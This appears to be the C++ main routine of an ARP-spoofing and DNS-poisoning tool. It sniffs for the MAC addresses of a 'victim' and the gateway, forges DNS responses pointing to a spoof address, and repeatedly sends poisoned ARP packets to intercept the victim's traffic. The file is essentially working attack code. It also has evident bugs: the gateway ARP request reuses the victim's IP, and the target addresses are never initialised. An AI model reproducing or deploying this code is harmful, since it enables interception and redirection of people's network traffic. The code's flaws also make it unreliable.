#include <iostream>
#include <unordered_map>
#include <vector>

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "NetworkEngine.h"
#include "UdpStack.h"

#include "dns.h"

// get the interface name, ip of gateway and ip of victim
// main program we need: interface name, ip of gateway, ip of victim
// dns poison we need: domain to poison, what to poison too
int main(int argc, const char *argv[]) {
    const char *interfaceName = "wlp59s0";                        // get this from config file
    std::unordered_map<std::string, std::string> domainsToPoison; // get this from config file

    unsigned char attackerMac[ETH_ALEN]; // get this from config file
    unsigned char victimMac[ETH_ALEN];   // get this from arp request
    unsigned char gatewayMac[ETH_ALEN];  // get this from arp request
    struct in_addr victimIp;             // get this from config file
    struct in_addr gatewayIp;            // get this from config file

    struct arp_header victimArp;
    struct arp_header gatewayArp;
    struct arp_header arpRequest;

    // tmp fake spoofing address
    struct in_addr spoofIp;
    spoofIp.s_addr = 0xdeadbeef;

    // prepare the mac variables
    memset(victimMac, 0, ETH_ALEN);
    memset(gatewayMac, 0, ETH_ALEN);

    bool victimMacSet = false;
    bool gatewayMacSet = false;
    NetworkEngine ipEngine(interfaceName);

    // start arp sniffing
    ipEngine.LoopCallbacks.clear();
    ipEngine.LoopCallbacks.push_back(
        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
            struct arp_header *arp = (struct arp_header *)(packet + 14);

            if (ntohs(arp->arp_hd) == ARPHRD_ETHER && ntohs(arp->arp_pr) == ETH_P_IP) {
                struct in_addr *tmp = (struct in_addr *)arp->arp_spa;
                if (tmp->s_addr == victimIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        victimMac[i] = arp->arp_sha[i];
                    }
                    victimMacSet = true;
                }

                if (tmp->s_addr == gatewayIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        gatewayMac[i] = arp->arp_sha[i];
                    }
                    gatewayMacSet = true;
                }
            }
        });
    ipEngine.startSniff(NetworkEngine::ARP_FILTER);

    // send arp request to get mac address of victim
    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
    ipEngine.sendArp(arpRequest);

    // send arp request to get the mac address of gateway
    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
    ipEngine.sendArp(arpRequest);

    // stop sniffing for macs once they have been found
    while (true) {
        if (victimMacSet && gatewayMacSet) {
            ipEngine.stopSniff();
            break;
        }
    }

    // start dns sniffing
    ipEngine.LoopCallbacks.clear();
    ipEngine.LoopCallbacks.push_back(
        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
            unsigned char buffer[1500];
            struct iphdr *ip;
            struct udphdr *udp;
            dnshdr *dns;

            int ipLen = 0;
            int udpLen = 0;
            int dnsLen = 0;

            // get ip hdr size
            ip = (iphdr *)(packet + 14);
            ipLen = ip->ihl * 4;

            // check to see if it is udp
            if (ip->protocol != IPPROTO_UDP) {
                return;
            }

            // get udp hdr and size
            udp = (udphdr *)(packet + 14 + ipLen);
            udpLen = UdpStack::UDP_HDR_LEN;

            // check that it is a dns packet
            if (ntohs(udp->source) != 53 && ntohs(udp->dest) != 53) {
                return;
            }

            // get dns header
            dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);

            // craft the poisoned response
            int responseSize = forgeDns(dns, &spoofIp, buffer);
            UCharVector payload(responseSize);
            memcpy(payload.data(), buffer, responseSize);

            // get the addresses
            struct in_addr src;
            struct in_addr dst;
            src.s_addr = ip->saddr;
            dst.s_addr = ip->daddr;

            // reply
            ipEngine.sendUdp(dst, src, udp->dest, udp->source, payload);
        });
    ipEngine.startSniff(NetworkEngine::IP_FILTER);

    // start arp poisoning
    forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
    forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);

    while (true) {
        ipEngine.sendArp(victimArp);
        ipEngine.sendArp(gatewayArp);
    }

    return 0;
}

